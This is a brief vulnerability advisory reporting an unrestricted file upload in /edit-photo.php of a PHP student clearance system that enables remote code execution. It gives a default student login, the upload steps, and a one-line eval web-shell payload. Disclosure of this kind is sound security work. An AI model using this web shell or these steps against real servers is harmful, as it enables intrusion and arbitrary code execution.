#### Title: web-based_student-system_RCE.md
#### Author: toyydsBT123
#### organize: Arr3stY0u
#### Organization introduction : https://www.shg-sec.com/
#### Date: 09/30/2022
#### Vendor: https://www.sourcecodester.com/users/tips23
#### Software: https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html
#### Version: 1.0
#### Reference: https://github.com/toyydsBT123/web-based-student/blob/main/web-based_student-system_RCE_poc.md

#### Description:
### Unrestricted POST upload file found in /edit-photo.php, resulting in remote code execution,User can make <?php phpinfo();?> or <?php eval($_GET['code'])?> to exploit

# Status: CRITICAL

### [+] Payloads:
student_user->(username:18/132010)(password:11111111) -> login.php ->/edit-photo.php->POST upload phpcodeFile ->(<?php phpinfo();?>) or (<?php eval($_GET['code'])?>)
send File->server -> Access the uploaded php file -> PHP RCE

```
###payload
```

## Proof and Exploit:
Burp![image](https://github.com/toyydsBT123/web-based-student/blob/main/1.png)
Firefox browser ![image](https://github.com/toyydsBT123/web-based-student/blob/main/2.png)
code ![image](https://github.com/toyydsBT123/web-based-student/blob/main/3.png)
